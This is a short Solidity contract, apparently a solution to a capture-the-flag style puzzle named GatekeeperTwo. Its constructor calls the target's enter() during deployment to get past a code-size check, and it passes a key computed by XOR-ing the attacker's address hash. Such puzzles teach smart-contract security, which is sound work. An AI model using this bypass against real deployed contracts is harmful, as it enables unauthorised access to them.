// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./target/GatekeeperTwo.sol";

contract GatekeeperTwoAttacker {
    GatekeeperTwo gatekeeper;

    constructor(address _gatekeeper) {
        gatekeeper = GatekeeperTwo(_gatekeeper);
        bytes8 hash = bytes8(keccak256(abi.encodePacked(address(this))));
        bytes8 p = hash ^ 0xffffffffffffffff;

        gatekeeper.enter(p);
    }
}
